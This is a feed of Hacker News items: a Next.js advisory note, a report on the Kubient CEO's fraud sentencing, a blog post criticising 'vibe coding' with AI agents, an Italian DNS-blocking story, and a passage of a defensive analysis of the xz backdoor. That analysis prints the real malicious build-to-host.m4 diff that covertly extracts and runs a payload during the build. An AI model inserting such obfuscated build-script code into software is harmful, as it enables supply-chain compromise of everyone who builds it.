<p>Next.js has published <a href="https://github.com/vercel/next.js/security/advisories?state=published" rel="noopener noreferrer" target="_blank">16 security advisories<span><svg data-testid="geist-icon" height="16" stroke-linejoin="round" style="color:currentColor" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" clip-rule="evenodd" d="M6.75011 4H6.00011V5.5H6.75011H9.43945L5.46978 9.46967L4.93945 10L6.00011 11.0607L6.53044 10.5303L10.499 6.56182V9.25V10H11.999V9.25V5C11.999 4.44772 11.5512 4 10.999 4H6.75011Z" fill="currentColor"></path></svg></span></a> since 2016. Over time, we've continued to improve how we gather, patch, and disclose vulnerabilities.</p>
<p>GitHub Security Advisories and CVEs are industry-standard approaches to notifying users, vendors, and companies of vulnerabilities in software. While we have published a CVE, <strong>we missed the mark</strong> on partner communications.</p>
<p>To help us more proactively work with partners depending on Next.js, and other infrastructure providers, we are opening a partner mailing list. Please reach out to <a href="mailto:partners@nextjs.org"><code>partners@nextjs.org</code></a> to be included.</p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[CEO of Kubient sentenced for fraud (162 pts)]]></title>
            <link>https://arstechnica.com/gadgets/2025/03/ceo-of-ai-ad-tech-firm-pledging-world-free-of-fraud-sentenced-for-fraud/</link>
            <guid>43448606</guid>
            <pubDate>Sat, 22 Mar 2025 21:02:40 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://arstechnica.com/gadgets/2025/03/ceo-of-ai-ad-tech-firm-pledging-world-free-of-fraud-sentenced-for-fraud/">https://arstechnica.com/gadgets/2025/03/ceo-of-ai-ad-tech-firm-pledging-world-free-of-fraud-sentenced-for-fraud/</a>, See on <a href="https://news.ycombinator.com/item?id=43448606">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
                      
                      
          <p>In <a href="https://web.archive.org/web/20240511122402/https://kubient.com/">May 2024</a>, the website of ad-tech firm Kubient touted that the company was "a perfect blend" of ad veterans and developers, "committed to solving the growing problem of fraud" in digital ads. Like many corporate sites, it also linked old blog posts from its home page, including <a href="https://web.archive.org/web/20240315021936/https://kubient.com/ad-fraud/how-to-create-a-world-free-of-fraud-kubients-secret-sauce/">a May 2022 post</a> on "How to create a world free of fraud: Kubient's secret sauce."</p>
<p>These days, Kubient's website cannot be reached, the team is no more, and CEO Paul Roberts is <a href="https://www.justice.gov/usao-sdny/pr/former-ceo-kubient-inc-sentenced-prison-connection-accounting-fraud-scheme">due to serve one year and one day in prison</a>, having pled guilty Thursday to creating his own small world of fraud. Roberts, according to federal prosecutors, schemed to create $1.3 million in fraudulent revenue statements to bolster Kubient's initial public offering (IPO) and significantly oversold "KAI," Kubient's artificial intelligence tool.</p>
<p>The core of the case is an I-pay-you, you-pay-me gambit that Roberts initiated with an unnamed "Company-1," according to prosecutors. Kubient and this firm would each bill the other for nearly identical amounts, with Kubient purportedly deploying KAI to find instances of ad fraud in the other company's ad spend.</p>
<p>Roberts, prosecutors said, "directed Kubient employees to generate fake KAI reports based on made-up metrics and no underlying data at all." These fake reports helped sell the story to independent auditors and book the synthetic revenue in financial statements, according to Roberts' indictment.</p>

          
                      
                  </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Quitting an Intel x86 Hypervisor (103 pts)]]></title>
            <link>https://halobates.de/blog/p/446</link>
            <guid>43448457</guid>
            <pubDate>Sat, 22 Mar 2025 20:42:04 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://halobates.de/blog/p/446">https://halobates.de/blog/p/446</a>, See on <a href="https://news.ycombinator.com/item?id=43448457">Hacker News</a></p>
Couldn't get https://halobates.de/blog/p/446: Error: unable to verify the first certificate]]></description>
        </item>
        <item>
            <title><![CDATA["Vibe Coding" vs. Reality (207 pts)]]></title>
            <link>https://cendyne.dev/posts/2025-03-19-vibe-coding-vs-reality.html</link>
            <guid>43448432</guid>
            <pubDate>Sat, 22 Mar 2025 20:35:51 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://cendyne.dev/posts/2025-03-19-vibe-coding-vs-reality.html">https://cendyne.dev/posts/2025-03-19-vibe-coding-vs-reality.html</a>, See on <a href="https://news.ycombinator.com/item?id=43448432">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="body"><article><time datetime="2025-03-19T15:00:00.000Z" title="3/19/2025, 10:00:00 AM">Published Mar 19, 2025</time> - 11 min read - <a href="https://cendyne.dev/posts/2025-03-19-vibe-coding-vs-reality.txt">Text Only</a><div id="table-of-contents-container"><p>Table of contents</p><ul><li><a href="#title" data-id="title">"Vibe Coding" vs Reality</a></li><li><a href="#working-around-the-problem" data-id="working-around-the-problem">Working around the problem</a></li><li><a href="#conclusion" data-id="conclusion">Conclusion</a></li></ul></div><p>There's a trend on social media where many repeat <a href="https://x.com/karpathy/status/1886192184808149383">Andrej Karpathy's words</a> (<a href="https://archive.is/yNSTA">archived</a>): "give in to the vibes, embrace exponentials, and forget that the code even exists." This belief — like many flawed takes humanity holds — comes from laziness, inexperience, and self-deluding imagination. It is called "Vibe Coding."</p><div><p><img width="128" height="128" alt="head-empty" src="https://cendyne.dev/s/128/cendyne/head-empty" sizes="128px"></p><div><p>"Embrace the exponentials" sounds like it came from an NFT junkie.</p></div></div><div><p><img width="128" height="128" alt="shinji-cup" src="https://cendyne.dev/s/128/cendyne/shinji-cup" sizes="128px"></p><div><p>Like the NFT crowd, there is a bubble of unreality they cling to justifying their perception of the world.</p></div></div><p>Producing software is now more accessible as newer tools allow people to describe what they want in a natural language to a large language model (LLM). This idea is catching on because LLM agents are now accessible to anyone willing to subscribe to vendors like <a href="https://www.cursor.com/en">Cursor</a>, <a href="https://code.visualstudio.com/blogs/2025/02/24/introducing-copilot-agent-mode">GitHub</a>, Windsurf, and others. These editors have an "agent" option where users can request something and in response changes are made to the appropriate files, rather than only the file currently in focus. Over time, the agent will request to run commands to run tests or even run scripts it previously wrote to the file system, much as you would if you were solving the problem.</p><p>In 2022, folks could copy code into <a href="https://en.wikipedia.org/wiki/ChatGPT">ChatGPT</a> and ask questions or for rewrites.</p><p>In 2023, folks could ask it to review and edit a single file with an IDE integration like Copilot.</p><p>In 2024 and 2025, folks could ask it to solve a specific problem in the project and have it find out what files to edit, edit them, then verify its own work, and correct any mistakes it made with feedback from linting errors and unit tests.</p><p>With LLM agents having so much capability, people can delegate the idea of refining their imprecise ideas to a precise implementation elaborated by an LLM through "Vibe Coding."</p><div><p><a href="https://twitter.com/a16z">@a16z</a> <a href="https://twitter.com/stuffyokodraws">@stuffyokodraws</a> First - what is vibe coding?</p><p>A concise definition from <a href="https://twitter.com/stuffyokodraws">@stuffyokodraws</a>, and then an exploration of how technical vs. non-technical users approach these tools.</p></div><p>If you open a blank folder and tell it to set up an initial project, it can do a lot at once. With no rules, no patterns to mimic, and no constraints, it can produce something that feels more tailored for you in minutes than <code>npx create-react-app</code> ever could.</p><p>With a simple instruction like "I want to create a website for my ski resort" and about ten minutes of having it massage errors of its own making, I can have just that.</p><p><img data-blurhash="MSQc#U~WxtIW%LM|t6t7WCt7^*9Zt7%LR*" data-width="645" data-height="423" data-ratio="true" src="https://cendyne.dev/c/XH7rgh3H?width=645" alt="A generated website about a ski resort with a phrase like 'Easy to Reach, Hard to Leave'" width="645" height="423"></p><p>These leaps of progress are what fuels the "Vibe Coding" idea. To go from nothing to something shareable and personal sounds incredible.</p><div><p><img width="128" height="128" alt="beat-saber" src="https://cendyne.dev/s/128/cendyne/beat-saber" sizes="128px"></p><div><p>This moment provided a thrill I hadn't experienced in a long time when coding. However, this excitement drained quickly the further I got from a blank canvas.</p></div></div><p>Agents, as a concept, aren’t new. <a href="https://www.youtube.com/watch?v=ijeXop674Dg">Google IO made up buzzwords</a> like <a href="https://www.theverge.com/2024/12/11/24317436/google-deepmind-project-astra-mariner-ai-agent">"agentic era"</a> (<a href="https://archive.is/dw8XE">archived</a>) to describe this concept. It has been realized through open technologies like <a href="https://github.com/Significant-Gravitas/AutoGPT">AutoGPT</a>, <a href="https://github.com/OpenBMB/XAgent">XAgent</a>, and <a href="https://www.anthropic.com/news/model-context-protocol">more recently by Anthropic</a> with the <a href="https://modelcontextprotocol.io/introduction">Model Context Protocol</a> (MCP).</p><p>When the model can interact with more than just a person who proxies their outputs into different domains, it is autonomous. If it can perform searches on the web or in a codebase, it can enrich its own context with the information it needs to fulfill the current request. Further, when it can commit outputs and then gain immediate and automatic feedback on those outputs, it can refine its solution without a person intervening.</p><p>There are actions that do prompt the user for consent before proceeding, such as running commands in the console or deleting files. This consent can be pre approved with a mode called "YOLO."</p><p><img data-blurhash="E04ec*~qofxuoft7D%Rj?b-;xut7" data-width="645" data-height="149" data-ratio="true" src="https://cendyne.dev/c/E8IJPCCd?width=645" alt="Cursor settings YOLO mode, allows running commands automatically" width="645" height="149"></p><div><p><img width="128" height="127" alt="we-live-in-a-society" src="https://cendyne.dev/s/128/cendyne/we-live-in-a-society" sizes="128px"></p><div><p>A mode for "You Only Live Once"!? Really?</p></div></div><p>You can witness this autonomy for yourself today in Cursor.</p><p>The agent concept has merit and today can deliver proofs of concept that <a href="https://youtu.be/IACHfKmZMr8">VC firms like Y-Combinator</a> will invest in — proofs of concept that are trash by unskilled founders hoping to win the lottery while living the life of leisure.</p><div><p>I’ve cracked vibe coding, TrendFeed has almost hit its first 10k month, and Ai built the entire thing</p><p>Im just sitting here sipping coffee, coding with Ai + MCP</p><p>Also more time to shitpost on X haha</p></div><div><p><img width="128" height="128" alt="cheers" src="https://cendyne.dev/s/128/cendyne/cheers" sizes="128px" loading="lazy"></p><div><p>The optimal technical founder for a VC is not the 10x engineer. It is someone who'll deliver <em>enough</em> of a product to test its fitness in the market and then succeed in raising more investment money. Their execution on their vision and hiring prowess is more important than their technical skillset.</p></div></div><p>The execution of agents today is over-hyped and does not hold up to the needs of any functioning businesses which need experts to develop and maintain their technical capabilities instead of single points of failure on the internet.</p><div><p>babe, come to bed</p><p>i can't, i'm vibe coding</p></div><p>These models are trained on average sloppy code, wrong answers on Stack Overflow, and the junk that ends up on Quora. Despite the power and capability Claude 3.7 Sonnet has in small contexts, when faced with even a small codebase it makes constant silly mistakes that no normal developer would repeat and continue to repeat every hour of its operation.</p><div><p><span></span><span>Specific details on the mistakes, feel free to skip</span><span></span></p><div><ul><li>Regularly clones TypeScript interfaces instead of exporting the original and importing it.</li><li>Reinvents components all the time with the same structure without searching the code base for an existing copy of that component.</li><li>Writes trusted server side logic on the client side, using RPC calls to update the database.</li><li>As a feature develops, it prioritizes maintaining previous mistakes instead of re-evaluating its design, even when told to do so. You have to say the previous implementation is outright unusable for it to replace its design.</li><li>Cursor has some sort of <a href="https://www.reddit.com/r/ClaudeAI/comments/1i8n3wq/does_claude_have_stupid_mode_enabled_tonight/">"concise mode"</a> (<a href="https://archive.is/iU8gx">archived</a>) that they'll turn on when there is high load where the model will still be rated at the normal price but behaves in a useless manner. This mode will omit details, drop important findings, and corrupt the output that is being produced.</li><li>Cannot be trusted to produce unit tests with decent coverage.</li><li>Will often break the project's code to fit a unit test rather than fix the unit test when told to do so.</li><li>When told to fix styles with precise details, it will alter the wrong component entirely.</li><li>When told specifically where there are many duplicated components and instructed to refactor, will only refactor the first instance of that component in the file instead of all instances in all files.</li><li>When told to refactor code, fails to search for the breaks it caused even when told to do so.</li><li>Will merrily produce files over 1000 lines which exceed its context window over time, even when told to refactor early on.</li><li>Will regularly erase entire route handlers if not bound to the file hierarchy.</li></ul></div></div><p>As currently designed, these models cannot learn new information. They cannot do better than the dataset they were created with. Instead their capability is realized by how effective they can process tokens entering their context window.</p><p>If you ask Claude 3.7 Sonnet to develop a runtime schema for validating some domain specific language and then ask it to refactor the file — because it is too large for its context window to continue — it will degrade and output incoherent nonsense before finishing its work.</p><p><img data-blurhash="E042PB?bM{kCWBof%M%MRjRjtRay" data-width="645" data-height="244" data-ratio="true" src="https://cendyne.dev/c/l6YxDTlA?width=645" alt="Now that we've created all the schemado that: ... I'v schema files for each schema schemaschema schemaactored code?" width="645" height="244" loading="lazy"></p><div><p><img width="128" height="110" alt="wat" src="https://cendyne.dev/s/128/cendyne/wat" sizes="128px" loading="lazy"></p><div><p>It did not type "I've" correctly and conjoined the words "schema" and "refactored" into one.</p></div></div><div><p>my saas was built with Cursor, zero hand written code</p><p>AI is no longer just an assistant, it’s also the builder</p><p>Now, you can continue to whine about it or start building.</p><p>P.S. Yes, people pay for it</p></div><p>You cannot ask these tools today to develop a performant React application. You cannot ask these tools to implement a secure user registration flow. It will choose to execute functions like is user registered on the client instead of the server.</p><div><p><img width="128" height="128" alt="trash" src="https://cendyne.dev/s/128/cendyne/trash" sizes="128px" loading="lazy"></p><div><p>Others are learning this the hard way too.</p></div></div><div><p>guys, i'm under attack</p><p>ever since I started to share how I built my SaaS using Cursor</p><p>random thing are happening, maxed out usage on api keys, people bypassing the subscription, creating random shit on db</p><p>as you know, I'm not technical so this is taking me longer that usual to figure out</p><p>for now, I will stop sharing what I do publicly on X</p><p>there are just some weird ppl out there</p></div><p>Without expert intervention, the best these tools can do today is produce a somewhat functional mockup, where every future change beyond that risks destroying existing functionality.</p><p>I cannot — and would not — trust a team member who vibe codes in a production application. The constant negligence I observe when "Vibe Coding" is atrocious and unacceptable to a customer base of any size.</p><p>No available model demonstrates consistent and necessary attention to detail needed for a production environment. They are not yet equipped or designed to transform information involving multiple contexts inherent to producing a digital product.</p><p>These tools are optimized to produce solutions that fit in a single screen of markdown and are now being asked to do far more than they were trained for. As the context window overflows and the model degrades, it will fail to even format MCP calls correctly and upon reaching this point of no return, produces a log that comes across as being tortured. Like a robot losing a limb, it will try and try again to walk only to fall down until the editor pauses the conversation to save on resources.</p><p><img data-blurhash="L03+Dt~q%2ofM{WURjWBx]t7WUj[" data-width="645" data-height="628" data-ratio="true" src="https://cendyne.dev/c/xNtV9Ji3?width=645" alt="Let me try a different approach. Error calling tool." width="645" height="628" loading="lazy"></p><h2 id="working-around-the-problem">Working around the problem</h2><p>A modern <a href="https://en.wikipedia.org/wiki/Twitch_Plays_Pok%C3%A9mon">"Twitch plays Pokémon"</a> is going on right now: <a href="https://www.twitch.tv/claudeplayspokemon">Claude Plays Pokémon</a>. It mitigates this context window problem by starting a new context with seeded information provided by its previous incarnation in the form of many Markdown files, which it can then read as if new and search via MCP during its playthrough.</p><div><div><p>So, what makes this possible? Claude was given a knowledge base to store notes, vision to see the screen, and function calls which allow it to simulate button presses and navigate the game.</p><p>Together, they allow Claude to sustain gameplay with tens of thousands of interactions.</p></div><p><img data-blurhash="L04epF.7M-a1.6t6WDofI2VtxstR" data-width="645" data-height="645" data-ratio="true" src="https://cendyne.dev/c/a9W5MgiW?width=645" alt="Photo included with tweet" width="645" height="645" loading="lazy"></p></div><p>Even so, it can make bad assumptions and spend 43 hours intentionally blacking out over and over in Mt. Moon (an in-game route between story locations) making no effective progress towards achieving its next goal because by the time it could second guess itself, its context window is no longer fit to continue.</p><p><video poster="https://cendyne.dev/c/-PEsNE-L" preload="metadata" playsinline="" controls="" autoplay="" loop="" muted="" width="644" height="362"><source src="https://cendyne.dev/c-no-index/3RrkLRXm" type="video/mp4"><img data-blurhash="L98zorE19a~C^+IoIo-p9t%2xaE1" data-width="644" data-height="362" data-ratio="true" src="https://cendyne.dev/c/-PEsNE-L?width=645" alt="Claude plays pokemon going through a context clean up and restart" width="644" height="362" loading="lazy"></video></p><div><p><img width="128" height="128" alt="galaxy-brain2" src="https://cendyne.dev/s/128/cendyne/galaxy-brain2" sizes="128px" loading="lazy"></p><div><p>It did escape and progress, but only after the critic instance of the model suggested its assumption was incorrect.</p></div></div><p>After a context cleanup completes, which takes about five minutes (the video above is edited to the meaningful moments), the model proceeds to make the same mistakes its prior incarnation did. The notes it wrote are not meaningfully interpreted in context, I find the same happens too with the Cursor rules I write.</p><p>While increasing the length of the context window will improve some immediate experiences, this is a problem of scale that needs a different solution for agents to be more effective and, perhaps, move "Vibe Coding" closer to reality.</p><div><p><img width="107" height="128" alt="thinker" src="https://cendyne.dev/s/128/cendyne/thinker" sizes="128px" loading="lazy"></p><div><p>Would a formalized <a href="https://bulletjournal.com/">bullet journal</a> over MCP help a model be more complete in delivering more reliable results?</p></div></div><div><div><p>As long as the model correctly checks it before concluding its work is complete!</p></div><p><img width="128" height="123" alt="point-left" src="https://cendyne.dev/s/128/jacobi/point-left" sizes="128px" loading="lazy"></p></div><p><img data-blurhash="K5SF;MIV~q?vt7%Mxuxuj[" data-width="645" data-height="669" data-ratio="true" src="https://cendyne.dev/c/FD-gkvrg?width=645" alt="Bullet journal with ski examples" width="645" height="669" loading="lazy"></p><p>A bullet journal may be one of many tools that improve the reliability of the models we have today.</p><p>The next issue is that these models cannot ingest information from multiple concurrent real-time sources. In one terminal we may be running the server and in another some end-to-end tests. Both of these terminals were created at the agent's request. It either ignores or is not fed the stack trace logged by the server in the first terminal as it watches the output of the end-to-end tests fail and retry, fail and retry.</p><p>For agents to have the impact promised by the hype, LLMs need a robust mechanism to mimic the development of short and long term memory without fine-tuning the memories into the model.</p><p>Furthermore, for agents to contribute to a team, there must be a way to develop long-term memories bound to the organization and its products that seamlessly merge with and reconcile with memories personal to each team member.</p><p>And lastly, these memories have to be portable. As models improve and are integrated into our tools, domain specific memories must be usable by the next generation of large language models.</p><h2 id="conclusion">Conclusion</h2><p>"Vibe Coding" might get you 80% the way to a functioning concept. But to produce something reliable, secure, and worth spending money on, you’ll need experienced humans to do the hard work not possible with today’s models.</p><p>Agents do demonstrate enough capability that LinkedIn CEO influencers confidently spread the unreality that we can replace jobs with "agentic AI."</p><p>Agents do enable skilled people to create more independently than they ever have. For the time being, it will not replace those that can solve the hard problems that only experience and intuition can identify. Like other no-code solutions, agents do give the less skilled more capability than they had the day before. Until they develop their own competent skill set, "Vibe Coders" will not be able to release production quality software in this world, no matter how <em>exponential</em> the agent is over their own inferior skill set.</p><p>Keep an eye on how LLM agents develop and improve. For now, they are worth evaluating and discussing, but are not ready for us to delegate the precise task of creating reliable, secure, and scalable software that powers our society. "Vibe Coding" will not create the next big thing in 2025.</p></article></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Mathematical Methods for Physics [pdf] (123 pts)]]></title>
            <link>https://www.ma.imperial.ac.uk/~dturaev/Mathematical_Methods2021.pdf</link>
            <guid>43448193</guid>
            <pubDate>Sat, 22 Mar 2025 19:58:52 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.ma.imperial.ac.uk/~dturaev/Mathematical_Methods2021.pdf">https://www.ma.imperial.ac.uk/~dturaev/Mathematical_Methods2021.pdf</a>, See on <a href="https://news.ycombinator.com/item?id=43448193">Hacker News</a></p>
&lt;Not HTML&gt;]]></description>
        </item>
        <item>
            <title><![CDATA[Italy demands Google poison DNS under strict Piracy Shield law (168 pts)]]></title>
            <link>https://arstechnica.com/gadgets/2025/03/italian-court-orders-google-to-block-iptv-pirate-sites-at-dns-level/</link>
            <guid>43448112</guid>
            <pubDate>Sat, 22 Mar 2025 19:46:04 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://arstechnica.com/gadgets/2025/03/italian-court-orders-google-to-block-iptv-pirate-sites-at-dns-level/">https://arstechnica.com/gadgets/2025/03/italian-court-orders-google-to-block-iptv-pirate-sites-at-dns-level/</a>, See on <a href="https://news.ycombinator.com/item?id=43448112">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
          
          
<p>Spotted by <a href="https://torrentfreak.com/court-orders-google-to-poison-public-dns-to-prevent-iptv-piracy-250321/">TorrentFreak</a>, AGCOM Commissioner Massimiliano Capitanio <a href="https://www.linkedin.com/feed/update/urn:li:activity:7308503541390741504/">took to LinkedIn</a> to celebrate the ruling, as well as the existence of the Italian Piracy Shield. "The Judge confirmed the value of AGCOM's investigations, once again giving legitimacy to a system for the protection of copyright that is unique in the world," said Capitanio.</p>
<p>Capitanio went on to complain that Google has routinely ignored AGCOM's listing of pirate sites, which are supposed to be blocked in 30 minutes or less under the law. He noted the violation was so clear-cut that the order was issued without giving Google a chance to respond, known as <em>inaudita altera parte</em> in Italian courts.</p>
<p>This decision follows a similar case against Internet backbone firm Cloudflare. In January, the Court of Milan found that Cloudflare's CDN, DNS server, and WARP VPN were facilitating piracy. The court threatened Cloudflare with fines of up to 10,000 euros per day if it did not begin blocking the sites.</p>
<p>Google could face similar sanctions, but AGCOM has had difficulty getting international tech behemoths to acknowledge their legal obligations in the country. We've reached out to Google for comment and will update this report if we hear back.</p>


          
                  </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[NixOS and reproducible builds could have detected the xz backdoor (271 pts)]]></title>
            <link>https://luj.fr/blog/how-nixos-could-have-detected-xz.html</link>
            <guid>43448075</guid>
            <pubDate>Sat, 22 Mar 2025 19:39:59 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://luj.fr/blog/how-nixos-could-have-detected-xz.html">https://luj.fr/blog/how-nixos-could-have-detected-xz.html</a>, See on <a href="https://news.ycombinator.com/item?id=43448075">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
            <h2 id="introduction">Introduction</h2>
<p>In March 2024, a backdoor was discovered in <code>xz</code>, a (de)-compression software that is regularly used at the core of Linux distributions to unpack source tarballs of packaged software. The backdoor had been covertly inserted by a malicious maintainer under the pseudonym of <em>Jia Tan</em> over a period of three years. This event deeply stunned the open source community as the attack was both of <strong>massive impact</strong> (it allowed <em>remote code execution</em> on all affected machines that had <code>ssh</code> installed) and <strong>extremely difficult to detect</strong>. In fact, it was only thanks to the diligence (and maybe luck) of Andres Freund – a Postgres developer working at Microsoft – that the catastrophe was avoided: while investigating a seemingly unrelated 500ms performance regression in <code>ssh</code> that he was experiencing on several <em>Debian unstable</em> machines, he was able to trace it back to the <code>liblzma</code> library, identify the backdoor and document it.</p>
<p>While it was already established that the open source supply chain was often the target of malicious actors, what is stunning is the amount of energy invested by <em>Jia Tan</em> to gain the trust of the maintainer of the <code>xz</code> project, acquire push access to the repository and then among other perfectly legitimate contributions insert – piece by piece – the code for a very sophisticated and obfuscated backdoor. This should be a wake up call for the OSS community. We should consider the open source supply chain a high value target for powerful threat actors, and to collectively find countermeasures against such attacks.</p>
<p>In this article, I’ll discuss the inner workings of the <code>xz</code> backdoor and how I think we could have mechanically detected it thanks to build reproducibility.</p>
<h2 id="how-does-the-attack-work">How does the attack work?</h2>
<p>The main intent of the backdoor is to allow for <em>remote code execution</em> on the target by hijacking the <code>ssh</code> program. To do that, it replaces the behavior of some of <code>ssh</code>’s functions (most importantly the <code>RSA_public_decrypt</code> one) in order to allow an attacker to execute arbitrary commands on a victim’s machine when some specific RSA key is used to log in. Two main pieces are combined to put together to install and activate the backdoor:</p>
<ol type="1">
<li><p><strong>A script to de-obfuscate and install a malicious object file as part of the <code>xz</code> build process.</strong>
Interestingly the backdoor was not comprehensively contained in the source code for <code>xz</code>. Instead, the malicious components were only contained in tarballs built and signed by the malicious maintainer <em>Jia Tan</em> and published alongside releases <code>5.6.0</code> and <code>5.6.1</code> of <code>xz</code>. This time the additional release tarball contained slight and disguised modifications to extract a malicious object file from the <code>.xz</code> files used as data for some test contained in the repository.</p></li>
<li><p><strong>A procedure to hook the <code>RSA_public_decrypt</code> function.</strong> The backdoor uses the <em>ifunc</em> mechanism of <code>glibc</code> to modify the address of the <code>RSA_public_function</code> when <code>ssh</code> is loaded, in case <code>ssh</code> links against <code>liblzma</code> through <code>libsystemd</code>.</p></li>
</ol>



<h2 id="a-script-to-de-obfuscate-and-install-a-malicious-object-file-as-part-of-the-xz-build-process">1. A script to de-obfuscate and install a malicious object file as part of the <code>xz</code> build process</h2>
<p>As explained above, the malicious object file is stored directly in the <code>xz</code> git repository, hidden in some test files. The project being a decompression software, test cases include <code>.xz</code> files to be decompressed, making it possible to hide some machine code into fake test files;
<strong>The backdoor is not active in the code contained in the git repository, it is only included by building <code>xz</code> from the tarball released by the project</strong>, which has a few differences with the actual contents of the repository, most importantly in the <code>m4/build-to-host.m4</code> file.</p>
<pre tabindex="0"><code><span><span>diff --git a/m4/build-to-host.m4 b/m4/build-to-host.m4</span></span>
<span><span>index f928e9ab..d5ec3153 100644</span></span>
<span><span>--- a/m4/build-to-host.m4</span></span>
<span><span>+++ b/m4/build-to-host.m4</span></span>
<span><span>@@</span><span> -1,4 +1,4 </span><span>@@</span></span>
<span><span>-</span><span># build-to-host.m4 serial 3</span></span>
<span><span>+</span><span># build-to-host.m4 serial 30</span></span>
<span><span> dnl Copyright (C) 2023-2024 Free Software Foundation, Inc.</span></span>
<span><span> dnl This file is free software; the Free Software Foundation</span></span>
<span><span> dnl gives unlimited permission to copy and/or distribute it,</span></span>
<span><span>@@</span><span> -37,6 +37,7 </span><span>@@</span><span> AC_DEFUN([gl_BUILD_TO_HOST],</span></span>
<span></span>
<span><span>   dnl Define somedir_c.</span></span>
<span><span>   gl_final_[$1]="$[$1]"</span></span>
<span><span>+</span><span>  gl_[$1]_prefix=`echo $gl_am_configmake | sed "s/.*\.//g"`</span></span>
<span><span>   dnl Translate it from build syntax to host syntax.</span></span>
<span><span>   case "$build_os" in</span></span>
<span><span>     cygwin*)</span></span>
<span><span>@@</span><span> -58,14 +59,40 </span><span>@@</span><span> AC_DEFUN([gl_BUILD_TO_HOST],</span></span>
<span><span>   if test "$[$1]_c_make" = '\"'"${gl_final_[$1]}"'\"'; then</span></span>
<span><span>     [$1]_c_make='\"$([$1])\"'</span></span>
<span><span>   fi</span></span>
<span><span>+</span><span>  if test "x$gl_am_configmake" != "x"; then</span></span>
<span><span>+</span><span>    gl_[$1]_config='sed \"r\n\" $gl_am_configmake | eval $gl_path_map | $gl_[$1]_prefix -d 2&gt;/dev/null'</span></span>
<span><span>+</span><span>  else</span></span>
<span><span>+</span><span>    gl_[$1]_config=''</span></span>
<span><span>+</span><span>  fi</span></span>
<span><span>+</span><span>  _LT_TAGDECL([], [gl_path_map], [2])dnl</span></span>
<span><span>+</span><span>  _LT_TAGDECL([], [gl_[$1]_prefix], [2])dnl</span></span>
<span><span>+</span><span>  _LT_TAGDECL([], [gl_am_configmake], [2])dnl</span></span>
<span><span>+</span><span>  _LT_TAGDECL([], [[$1]_c_make], [2])dnl</span></span>
<span><span>+</span><span>  _LT_TAGDECL([], [gl_[$1]_config], [2])dnl</span></span>
<span><span>   AC_SUBST([$1_c_make])</span></span>
<span><span>+</span></span>
<span><span>+</span><span>  dnl If the host conversion code has been placed in $gl_config_gt,</span></span>
<span><span>+</span><span>  dnl instead of duplicating it all over again into config.status,</span></span>
<span><span>+</span><span>  dnl then we will have config.status run $gl_config_gt later, so it</span></span>
<span><span>+</span><span>  dnl needs to know what name is stored there:</span></span>
<span><span>+</span><span>  AC_CONFIG_COMMANDS([build-to-host], [eval $gl_config_gt | $SHELL 2&gt;/dev/null], [gl_config_gt="eval \$gl_[$1]_config"])</span></span>
<span><span> ])</span></span>
<span></span>
<span><span> dnl Some initializations for gl_BUILD_TO_HOST.</span></span>
<span><span> AC_DEFUN([gl_BUILD_TO_HOST_INIT],</span></span>
<span><span> [</span></span>
<span><span>+</span><span>  dnl Search for Automake-defined pkg* macros, in the order</span></span>
<span><span>+</span><span>  dnl listed in the Automake 1.10a+ documentation.</span></span>
<span><span>+</span><span>  gl_am_configmake=`grep -aErls "#{4}[[:alnum:]]{5}#{4}$" $srcdir/ 2&gt;/dev/null`</span></span>
<span><span>+</span><span>  if test -n "$gl_am_configmake"; then</span></span>
<span><span>+</span><span>    HAVE_PKG_CONFIGMAKE=1</span></span>
<span><span>+</span><span>  else</span></span>
<span><span>+</span><span>    HAVE_PKG_CONFIGMAKE=0</span></span>
<span><span>+</span><span>  fi</span></span>
<span><span>+</span></span>
<span><span>   gl_sed_double_backslashes='s/\\/\\\\/g'</span></span>
<span><span>   gl_sed_escape_doublequotes='s/"/\\"/g'</span></span>
<span><span>+</span><span>  gl_path_map='tr "\t \-_" " \t_\-"'</span></span>
<span><span> changequote(,)dnl</span></span>
<span><span>   gl_sed_escape_for_make_1="s,\\([ \"&amp;'();&lt;&gt;\\\\\`|]\\),\\\\\\1,g"</span></span>
<span><span> changequote([,])dnl</span></span>
<span></span></code></pre>

<p>While these changes may look benign to the naive eyes and well commented, they are actually hiding a chain of commands that decrypts/deobfuscates several fake <code>.xz</code> test files to ultimately produce two files:</p>
<ul>
<li>a shell script that is run during the build of <code>xz</code> ;</li>
<li>a malicious binary object file.</li>
</ul>
<p>There is an <a href="https://research.swtch.com/xz-script">excellent analysis from Russ Cox</a> that explains in detail how these two malicious resources are produced during the build process, and I advise any interested reader to find all relevant details there.</p>
<p>The shell script run during the build has two main purposes:</p>
<ol type="1">
<li>Verifying that the conditions to execute the backdoor are met on the builder (the backdoor targets specific Linux distributions, needs specific features of the <code>glibc</code> activated, needs <code>ssh</code> installed, etc) ;</li>
<li>Modifying the (legitimate) <code>liblzma_la-crc64_fast.o</code> to use the <code>_get_cpuid</code> symbol defined in the backdoor object file.</li>
</ol>
<h2 id="a-procedure-to-hook-the-rsa_public_decrypt-function">2. A procedure to hook the <code>RSA_public_decrypt</code> function</h2>
<p>So how does a backdoor in the <code>xz</code> executable have any effect on <code>ssh</code>?
To understand that, we have to take a little detour in the realm of dynamic loaders and dynamically linked programs. Whenever a program depends on a library, there are two ways that library can be linked into the final executable:</p>
<ul>
<li>statically, in that case the library is embedded into the final executable, hence increasing its size ;</li>
<li>dynamically, in which case it is the role of the dynamic loader (<code>ld-linux.so</code> in Linux) to find that shared library when the program starts and load it in memory.</li>
</ul>
<p>When a program is compiled using dynamic linking, the addresses of the symbols belonging to dynamically linked libraries cannot be provided at compilation time: their position in memory is not know ahead of time! Instead, a reference to the <em>Global Offset Table</em> (or <em>GOT</em>) is inserted. When the program is started, the actual addresses are filled in the GOT by the dynamic linker.</p>
